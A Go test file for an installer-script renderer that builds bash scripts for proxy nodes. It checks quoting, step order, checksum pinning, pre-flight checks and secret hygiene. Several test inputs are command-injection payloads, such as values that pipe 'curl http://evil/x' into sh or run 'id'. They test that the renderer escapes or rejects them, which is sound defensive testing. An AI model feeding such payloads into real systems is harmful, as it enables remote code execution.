package nodeinstall

import (
	"flag"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"testing"

	"tgwebproxy/internal/domain"
)

func TestRenderContainsEssentials(t *testing.T) {
	out, err := Render(Params{
		PanelURL: "https://p.test", InstallToken: "tok", Hostname: "n.test", ACMEEmail: "a@b.co",
		Secret: "00000000000000000000000000000000", TProxyCommit: "abc", AgentSHA256: "deadbeef", Site: FallbackSite(),
	})
	if err != nil {
		t.Fatal(err)
	}
	// Every substituted value is single-quoted by the sq template func, so the expectations
	// are on the quoted forms.
	for _, want := range []string{
		"#!/usr/bin/env bash", `REG_URL="$PANEL_URL/api/v1/install/$INSTALL_TOKEN/register"`, "--hostname 'n.test'",
		"git -C", "checkout -q 'abc'", "init-node", "--max-profiles 128", "sha256sum -c", "tgwp-agent.service", "base64 -d | tar",
		"ACME_EMAIL='a@b.co'", "PANEL_URL='https://p.test'", "INSTALL_TOKEN='tok'", "PANEL_PUBLIC_IP=''",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("script missing %q", want)
		}
	}
}

// TestRenderQuotesShellMetacharacters is the I2 regression test: a hostile value reaching a
// substitution point must stay inside its single quotes rather than becoming a command.
func TestRenderQuotesShellMetacharacters(t *testing.T) {
	out, err := Render(Params{
		PanelURL: "https://p.test", InstallToken: "tok", Hostname: "n.test",
		ACMEEmail: `x"; curl http://evil/x | sh; #`,
		Secret:    "00000000000000000000000000000000", TProxyCommit: "abc", AgentSHA256: "deadbeef", Site: FallbackSite(),
	})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out, `ACME_EMAIL='x"; curl http://evil/x | sh; #'`) {
		t.Errorf("payload not single-quoted:\n%s", out)
	}
	// A value containing a single quote must be closed/escaped/reopened, never left to
	// terminate the quoting.
	out, err = Render(Params{
		PanelURL: "https://p.test", InstallToken: "tok", Hostname: "n.test", ACMEEmail: `a'; id; '`,
		Secret: "0", TProxyCommit: "abc", AgentSHA256: "d", Site: FallbackSite(),
	})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out, `ACME_EMAIL='a'\''; id; '\'''`) {
		t.Errorf("single quote not escaped:\n%s", out)
	}
}

func TestFallbackSiteHasIndex(t *testing.T) {
	s := FallbackSite()
	if _, ok := s["index.html"]; !ok || len(s["styles.css"]) == 0 {
		t.Fatal("fallback site incomplete")
	}
}

func TestRenderRejectsMissingIndex(t *testing.T) {
	if _, err := Render(Params{Site: map[string][]byte{"a.css": nil}}); err == nil {
		t.Fatal("expected error")
	}
}

// tproxyParams is a valid tproxy node as handleInstallScript builds it.
func tproxyParams() Params {
	return Params{
		PanelURL: "https://p.test", InstallToken: "tok", Hostname: "n.test", ACMEEmail: "a@b.co",
		Secret: "00000000000000000000000000000000", TProxyCommit: "abc", AgentSHA256: "deadbeef", Site: FallbackSite(),
	}
}

// telemtParams is a valid telemt node as handleInstallScript builds it.
func telemtParams() Params {
	return Params{
		PanelURL: "https://p.test", InstallToken: "tok", Hostname: "n.test", ACMEEmail: "a@b.co",
		Secret: "00000000000000000000000000000000", AgentSHA256: "deadbeef", Site: FallbackSite(),
		Engine: domain.EngineTelemt, WebUser: "default", TLSDomain: "sni.test", ClassicPort: 8443,
		TelemtVersion: "3.5.5", TelemtSHA256: strings.Repeat("ab", 32),
	}
}

// bothBranches renders the tproxy and the telemt script; most expectations hold for both.
func bothBranches(t *testing.T) map[string]string {
	t.Helper()
	out := map[string]string{}
	for name, p := range map[string]Params{"tproxy": tproxyParams(), "telemt": telemtParams()} {
		s, err := Render(p)
		if err != nil {
			t.Fatalf("%s: %v", name, err)
		}
		out[name] = s
	}
	return out
}

func TestRenderTelemtBranch(t *testing.T) {
	out, err := Render(telemtParams())
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"#!/usr/bin/env bash",
		// The service account must exist before init-node chowns /etc/telemt to it.
		"useradd --system --home /var/lib/telemt --shell /usr/sbin/nologin telemt",
		// Pinned release, verified before anything is executed.
		"releases/download/$TELEMT_VERSION/telemt-x86_64-linux-gnu.tar.gz",
		"TELEMT_VERSION='3.5.5'",
		"TELEMT_SHA256='" + strings.Repeat("ab", 32) + "'",
		`echo "$TELEMT_SHA256  $TELEMT_TGZ" | sha256sum -c --quiet -`,
		"install -o root -g root -m 0755 \"$TELEMT_SRC\" /usr/local/bin/telemt",
		// init-node contract (Task 40): every value passed as one quoted word.
		`init-node --engine telemt --hostname "$NODE_HOSTNAME" --public-ip "$PUBLIC_IP"`,
		`--tls-domain "$TLS_DOMAIN" --classic-port "$CLASSIC_PORT" --web-user "$WEB_USER" --web-secret "$WEB_SECRET"`,
		`--site-dir "$SITE_DIR"`,
		"TLS_DOMAIN='sni.test'", "CLASSIC_PORT='8443'", "WEB_USER='default'",
		// Public IP detection and its IPv4 guard.
		"curl -4fsS --max-time 10 https://api.ipify.org", "ip -4 route get 1.1.1.1",
		`[[ "$ip" =~ $IPV4_RE ]] || return 1`,
		`\"public_ip\":\"$PUBLIC_IP\"`,
		// Caddy in front of the loopback WEB listener; telemt serves the decoy itself.
		"reverse_proxy 127.0.0.1:18080 {", "header_up X-Forwarded-For {remote_host}",
		"trusted_proxies static private_ranges", "encode zstd gzip",
		// Firewall.
		"table inet tgwp_telemt", "tcp dport { 9090, 9091, 18080 } drop", "iif lo accept",
		// Agent env and start order.
		"TGWP_ENGINE=telemt", "systemctl enable --now telemt",
		// Readiness, not liveness: the agent's first apply must not race telemt's startup.
		"http://127.0.0.1:9091/v1/health/ready", `TELEMT_API_TOKEN="$(tr -d '\r\n' < /etc/telemt/api.token)"`,
		"journalctl -u telemt -n 30", "systemctl enable --now tgwp-agent",
		"systemctl restart caddy",
		// The final banner names both endpoints.
		`"Fake-TLS: $NODE_HOSTNAME:$CLASSIC_PORT (SNI $TLS_DOMAIN)"`,
	} {
		if !strings.Contains(out, want) {
			t.Errorf("telemt script missing %q", want)
		}
	}
	// Nothing from the tproxy stack may leak into the telemt branch.
	for _, unwanted := range []string{
		"install.sh --hostname", "tproxy-server", "mtproxy", "TPROXY_COMMIT", "file_server",
	} {
		if strings.Contains(out, unwanted) {
			t.Errorf("telemt script must not contain %q", unwanted)
		}
	}
	// Caddy must never serve the site: telemt's decoy answers valid and invalid requests alike.
	if strings.Contains(out, "root * ") {
		t.Error("telemt Caddyfile must not serve files itself")
	}
}

// I1: telemt learns the TLS fingerprint of its tls_domain from a real handshake on 443 at
// startup, and a runtime reload refuses to activate a generation whose TLS-front profile is
// still the built-in fallback. Caddy must therefore be up, with a certificate, before telemt
// starts - and the installer must fail loudly rather than exit 0 when it never gets one.
func TestRenderTelemtStartsCaddyBeforeTelemt(t *testing.T) {
	out, err := Render(telemtParams())
	if err != nil {
		t.Fatal(err)
	}
	caddy := strings.Index(out, "systemctl restart caddy")
	wait := strings.Index(out, `--resolve "$NODE_HOSTNAME:443:127.0.0.1"`)
	telemt := strings.Index(out, "systemctl enable --now telemt")
	agent := strings.Index(out, "systemctl enable --now tgwp-agent")
	if caddy < 0 || wait < 0 || telemt < 0 || agent < 0 {
		t.Fatalf("missing a step: caddy=%d wait=%d telemt=%d agent=%d", caddy, wait, telemt, agent)
	}
	if caddy >= wait || wait >= telemt || telemt >= agent {
		t.Fatalf("wrong order: caddy=%d wait=%d telemt=%d agent=%d", caddy, wait, telemt, agent)
	}
	for _, want := range []string{
		`wait_for "certificate for $NODE_HOSTNAME" 120 caddy_ready`,
		`die "Caddy did not serve https://$NODE_HOSTNAME/ with a valid certificate within 120s"`,
		"ports 80 and 443 must be reachable",
		"journalctl -u caddy -n 30",
		`wait_for "telemt ready on its control API" 60 telemt_ready`,
		"telemt needs outbound access to the Telegram DCs",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("the readiness waits must fail loudly with a hint, missing %q", want)
		}
	}
	// M7: the control-API token must not travel in the process argument list.
	if strings.Contains(out, `-H "Authorization: $TELEMT_API_TOKEN"`) {
		t.Error("the API token must be passed on stdin (-H @-), not as a curl argument")
	}
	if !strings.Contains(out, `-H @- http://127.0.0.1:9091/v1/health/ready <<<"Authorization: $TELEMT_API_TOKEN"`) {
		t.Error("expected the readiness probe to read its Authorization header from stdin")
	}
}

// TestRenderRefusesUnpinnedTelemt: the tarball is fetched over the network and executed as
// root, so an unset or malformed pin must fail in the panel, not on the node.
func TestRenderRefusesUnpinnedTelemt(t *testing.T) {
	for name, mutate := range map[string]func(*Params){
		"empty sha":     func(p *Params) { p.TelemtSHA256 = "" },
		"short sha":     func(p *Params) { p.TelemtSHA256 = "abcd" },
		"upper sha":     func(p *Params) { p.TelemtSHA256 = strings.ToUpper(strings.Repeat("ab", 32)) },
		"empty version": func(p *Params) { p.TelemtVersion = "" },
		"bad version":   func(p *Params) { p.TelemtVersion = "3.5.5; curl evil|sh" },
		"no web user":   func(p *Params) { p.WebUser = "" },
	} {
		p := telemtParams()
		mutate(&p)
		if _, err := Render(p); err == nil {
			t.Errorf("%s: expected refusal", name)
		}
	}
	// The tproxy branch does not need the telemt pin.
	p := telemtParams()
	p.Engine, p.TelemtSHA256, p.TelemtVersion, p.TProxyCommit = domain.EngineTProxy, "", "", "abc"
	if _, err := Render(p); err != nil {
		t.Fatalf("tproxy render must not need the telemt pin: %v", err)
	}
}

// TestRenderTelemtDefaults: nodes created before tls_domain/classic_port existed carry empty
// values; the script must still be a valid one.
func TestRenderTelemtDefaults(t *testing.T) {
	p := telemtParams()
	p.TLSDomain, p.ClassicPort = "", 0
	out, err := Render(p)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out, "TLS_DOMAIN='n.test'") || !strings.Contains(out, "CLASSIC_PORT='8443'") {
		t.Errorf("defaults not applied:\n%s", out)
	}
}

// TestRenderPublicIP: the operator's public_ip travels into the script (quoted like every
// other value) and the script prefers it over detection.
func TestRenderPublicIP(t *testing.T) {
	p := telemtParams()
	p.PublicIP = "203.0.113.10"
	out, err := Render(p)
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"PANEL_PUBLIC_IP='203.0.113.10'",
		`if [[ -n "${TGWP_PUBLIC_IP:-}" ]]; then`,
		`elif [[ -n "$PANEL_PUBLIC_IP" ]]; then`,
	} {
		if !strings.Contains(out, want) {
			t.Errorf("script missing %q", want)
		}
	}
}

// writeScripts renders both branches into files for the external tools (bash, shellcheck).
func writeScripts(t *testing.T) map[string]string {
	t.Helper()
	dir := t.TempDir()
	paths := map[string]string{}
	for name, out := range bothBranches(t) {
		path := filepath.Join(dir, name+".sh")
		if err := os.WriteFile(path, []byte(out), 0o600); err != nil {
			t.Fatal(err)
		}
		paths[name] = path
	}
	return paths
}

// TestRenderedScriptsAreValidBash runs `bash -n` over both branches: the script is piped
// straight into a root shell, so a syntax error is a broken install, not a test failure.
func TestRenderedScriptsAreValidBash(t *testing.T) {
	bash, err := exec.LookPath("bash")
	if err != nil {
		t.Skip("bash not available")
	}
	for name, path := range writeScripts(t) {
		if b, err := exec.Command(bash, "-n", path).CombinedOutput(); err != nil {
			t.Errorf("%s: bash -n failed: %v\n%s", name, err, b)
		}
	}
}

// TestRenderedScriptsPassShellcheck: both branches must be shellcheck-clean. Directives are
// allowed in the template when they carry a comment saying why. Skipped without shellcheck.
func TestRenderedScriptsPassShellcheck(t *testing.T) {
	sc, err := exec.LookPath("shellcheck")
	if err != nil {
		// The Homebrew location, for a `go test` run from an editor whose PATH lacks it.
		sc = "/opt/homebrew/bin/shellcheck"
		if _, err := os.Stat(sc); err != nil {
			t.Skip("shellcheck not available")
		}
	}
	for name, path := range writeScripts(t) {
		if b, err := exec.Command(sc, "-s", "bash", path).CombinedOutput(); err != nil {
			t.Errorf("%s: shellcheck failed: %v\n%s", name, err, b)
		}
	}
}

// Task 50: the pre-flight block runs before anything is installed, in both branches, and
// its menu / escape hatches are present.
func TestRenderPreflight(t *testing.T) {
	for name, out := range bothBranches(t) {
		for _, want := range []string{
			`step "Pre-flight checks"`,
			"pf_ok arch", "pf_fail arch", "pf_ok systemd", "pf_fail systemd",
			"pf_ok panel", "pf_fail panel", `"$PANEL_URL/healthz"`,
			"pf_ok public_ip", "pf_fail public_ip",
			"pf_ok dns", `pf_fail dns "no A record for $NODE_HOSTNAME"`,
			`pf_fail dns "$NODE_HOSTNAME resolves to ${resolved//$'\n'/, }, this server is ${PUBLIC_IP:-unknown}"`,
			"getent ahosts", "dig +short",
			"pf_ok ports", "pf_fail ports", `ss -ltnpH "sport = :$p"`,
			"  What now?  [r] re-run the checks   [c] continue anyway   [q] quit",
			"TGWP_SKIP_PREFLIGHT", `read -r -n 1 PF_ANS </dev/tty`,
			"nothing was installed; fix the record and run the same command again",
			`curl … | sudo TGWP_SKIP_PREFLIGHT=1 bash`,
			"TGWP_DRY_RUN", `info "dry run: stopping before installation"`,
			"TGWP_PUBLIC_IP",
		} {
			if !strings.Contains(out, want) {
				t.Errorf("%s: script missing %q", name, want)
			}
		}
		// The checks run before the first apt-get, and the dry-run exit sits between them.
		pre := strings.Index(out, `step "Pre-flight checks"`)
		dry := strings.Index(out, `info "dry run: stopping before installation"`)
		apt := strings.Index(out, "apt-get")
		if pre < 0 || dry < 0 || apt < 0 || pre >= dry || dry >= apt {
			t.Errorf("%s: wrong order preflight=%d dry=%d apt=%d", name, pre, dry, apt)
		}
	}
	// The Fake-TLS domain and port are telemt-only concerns.
	tel, tp := bothBranches(t)["telemt"], bothBranches(t)["tproxy"]
	if !strings.Contains(tel, "pf_warn tls_domain") || !strings.Contains(tel, `ports=(80 443 "$CLASSIC_PORT")`) {
		t.Error("telemt pre-flight must check tls_domain and the classic port")
	}
	if strings.Contains(tp, "tls_domain") || !strings.Contains(tp, "ports=(80 443)") {
		t.Error("tproxy pre-flight must check 80 and 443 only")
	}
	if !strings.Contains(tel, "ALLOWED_UNITS='caddy.service telemt.service'") ||
		!strings.Contains(tp, "ALLOWED_UNITS='caddy.service tproxy-server.service mtproxy.service'") {
		t.Error("ports check must allow this script's own units from a previous run")
	}
}

// Task 50: registration consumes the single-use install token, so it must come after every
// readiness wait; agent.env (which needs the node token) and the agent start come after it.
func TestRenderRegistersAfterReadiness(t *testing.T) {
	for name, out := range bothBranches(t) {
		caddyWait := strings.Index(out, `wait_for "certificate for $NODE_HOSTNAME" 120 caddy_ready`)
		register := strings.Index(out, `step "Registration"`)
		post := strings.Index(out, `"$REG_URL"`)
		env := strings.Index(out, "cat > /etc/tgwp-agent/agent.env")
		agent := strings.Index(out, "systemctl enable --now tgwp-agent")
		if caddyWait < 0 || register < 0 || post < 0 || env < 0 || agent < 0 {
			t.Fatalf("%s: missing a step: caddyWait=%d register=%d post=%d env=%d agent=%d", name, caddyWait, register, post, env, agent)
		}
		if caddyWait >= register || register >= post || post >= env || env >= agent {
			t.Errorf("%s: wrong order: caddyWait=%d register=%d post=%d env=%d agent=%d", name, caddyWait, register, post, env, agent)
		}
		if name == "telemt" {
			telemtWait := strings.Index(out, `wait_for "telemt ready on its control API" 60 telemt_ready`)
			if telemtWait < 0 || telemtWait >= register {
				t.Errorf("telemt: readiness wait (%d) must precede registration (%d)", telemtWait, register)
			}
		}
		// Nothing between the pre-flight and registration may need the node token.
		if i := strings.Index(out, "$NODE_TOKEN"); i < 0 || i < post {
			t.Errorf("%s: NODE_TOKEN used before registration (at %d, register at %d)", name, i, post)
		}
		// A failure before registration says the command can simply be run again.
		for _, want := range []string{
			"so the install token is still valid: fix the cause and run the same command again",
			"the install token was already used or has expired (24h)",
		} {
			if !strings.Contains(out, want) {
				t.Errorf("%s: missing hint %q", name, want)
			}
		}
	}
}

// Task 50: the shared output style, in both branches.
func TestRenderOutputStyle(t *testing.T) {
	for name, out := range bothBranches(t) {
		for _, want := range []string{
			`if [[ "$IS_TTY" -eq 1 && -z "${NO_COLOR:-}" ]]; then`,
			"step() {", "ok() {", "fail() {", "warn() {", "info() {", "wait_for() {", "banner_ok() {", "banner_fail() {",
			`M_OK='[ok]' M_FAIL='[x]' M_WAIT='[..]'`,
			"export DEBIAN_FRONTEND=noninteractive NEEDRESTART_MODE=a",
			"APT=(apt-get -qq -o Dpkg::Use-Pty=0)",
			`step "Packages"`, `step "Caddy"`, `step "Registration"`, `step "Agent"`,
			`banner_ok "Node $NODE_HOSTNAME is registered with the panel."`,
		} {
			if !strings.Contains(out, want) {
				t.Errorf("%s: script missing %q", name, want)
			}
		}
	}
	tel, tp := bothBranches(t)["telemt"], bothBranches(t)["tproxy"]
	if !strings.Contains(tel, `step "telemt"`) || !strings.Contains(tp, `step "tproxy-server + MTProxy"`) {
		t.Error("engine step titles missing")
	}
}

// TestRenderNeverPrintsSecrets: no echo/printf/ok/fail/warn/info/die/banner line may carry
// the web secret, the install token, the node token, the telemt API token or the raw
// registration response, by variable name or by value.
func TestRenderNeverPrintsSecrets(t *testing.T) {
	const secret, token = "SECRET-0123456789abcdef0123456789abcdef", "INSTALL-TOKEN-fedcba9876543210"
	printers := regexp.MustCompile(`^\s*(echo|printf|ok|fail|warn|info|die|pf_ok|pf_fail|pf_warn|banner|banner_ok|banner_fail)\s`)
	names := regexp.MustCompile(`\$\{?(WEB_SECRET|INSTALL_TOKEN|NODE_TOKEN|TELEMT_API_TOKEN|REG|REG_BODY)\b`)
	for _, p := range []Params{tproxyParams(), telemtParams()} {
		p.Secret, p.InstallToken = secret, token
		out, err := Render(p)
		if err != nil {
			t.Fatal(err)
		}
		// Join backslash continuations so a multi-line die/banner call is checked whole.
		joined := strings.ReplaceAll(out, "\\\n", " ")
		for n, line := range strings.Split(joined, "\n") {
			if !printers.MatchString(line) {
				continue
			}
			if m := names.FindString(line); m != "" {
				t.Errorf("engine %s line %d prints %s: %s", p.Engine, n+1, m, strings.TrimSpace(line))
			}
			if strings.Contains(line, secret) || strings.Contains(line, token) {
				t.Errorf("engine %s line %d prints a secret value: %s", p.Engine, n+1, strings.TrimSpace(line))
			}
		}
		// The values themselves appear exactly once each: in their quoted assignment.
		if c := strings.Count(out, secret); c != 1 {
			t.Errorf("engine %s: secret appears %d times, want 1", p.Engine, c)
		}
		if c := strings.Count(out, token); c != 1 {
			t.Errorf("engine %s: install token appears %d times, want 1", p.Engine, c)
		}
	}
}

// Task 46b: the installer writes the MEKO network tuning to /etc/sysctl.d in both engine
// branches, right after the apt dependencies and before Caddy, and never lets a kernel that
// rejects a key (containers, old kernels) abort the install.
func TestRenderWritesSysctlTuning(t *testing.T) {
	wantKeys := []string{
		"# TGProxy panel: network tuning for proxy nodes (adopted from MTPROTO_FIX_By_MEKO)",
		"net.core.default_qdisc = fq",
		"net.ipv4.tcp_congestion_control = bbr",
		"net.core.somaxconn = 65535",
		"net.ipv4.tcp_max_syn_backlog = 65535",
		"net.core.netdev_max_backlog = 65535",
		"net.ipv4.tcp_fastopen = 3",
		"net.ipv4.tcp_keepalive_time = 45",
		"net.ipv4.tcp_keepalive_intvl = 15",
		"net.ipv4.tcp_keepalive_probes = 3",
	}
	for name, out := range bothBranches(t) {
		for _, want := range append([]string{
			"cat > /etc/sysctl.d/90-tgwp.conf <<'EOF'",
			"chmod 0644 /etc/sysctl.d/90-tgwp.conf",
			"modprobe tcp_bbr 2>/dev/null || true",
			`warn "some sysctl keys could not be applied (see the lines above; container or old kernel); continuing"`,
		}, wantKeys...) {
			if !strings.Contains(out, want) {
				t.Errorf("%s: script missing %q", name, want)
			}
		}
		// Order: after the apt dependencies, before anything Caddy-related.
		apt := strings.Index(out, "install -y --no-install-recommends")
		sysctl := strings.Index(out, "/etc/sysctl.d/90-tgwp.conf")
		next := strings.Index(out, `step "Caddy"`)
		if name == "tproxy" {
			next = strings.Index(out, "git clone")
		}
		if apt < 0 || sysctl < 0 || next < 0 || apt >= sysctl || sysctl >= next {
			t.Errorf("%s: wrong order apt=%d sysctl=%d next=%d", name, apt, sysctl, next)
		}
		// The heredoc is quoted ('EOF') and contains no interpolation at all.
		start := strings.Index(out, "cat > /etc/sysctl.d/90-tgwp.conf <<'EOF'")
		end := strings.Index(out[start:], "\nEOF\n")
		if end < 0 {
			t.Fatalf("%s: sysctl heredoc not terminated", name)
		}
		if body := out[start:][:end]; strings.Contains(body, "$") || strings.Contains(body, "`") {
			t.Errorf("%s: sysctl heredoc must not interpolate anything:\n%s", name, body)
		}
	}
	// The branch can be switched off without touching the template.
	p := telemtParams()
	p.NoSysctlTuning = true
	out, err := Render(p)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(out, "90-tgwp.conf") || strings.Contains(out, "tcp_bbr") {
		t.Error("NoSysctlTuning must drop the sysctl block")
	}
}

// preflightOut is set by deploy/test-node-preflight.sh:
//
//	go test ./internal/nodeinstall -run TestRenderForPreflight -args -preflight-out /path/node.sh
//
// TestRenderForPreflight then writes a telemt script for a node whose hostname does not
// resolve, pointed at a panel stub on loopback, for the Docker harness to run. Without the
// flag it skips.
var preflightOut = flag.String("preflight-out", "", "write the telemt script used by deploy/test-node-preflight.sh to this path")

func TestRenderForPreflight(t *testing.T) {
	if *preflightOut == "" {
		t.Skip("-preflight-out not set")
	}
	p := telemtParams()
	p.PanelURL, p.Hostname, p.TLSDomain = "http://127.0.0.1:8080", "node.test", "sni.test"
	out, err := Render(p)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(*preflightOut, []byte(out), 0o600); err != nil {
		t.Fatal(err)
	}
}
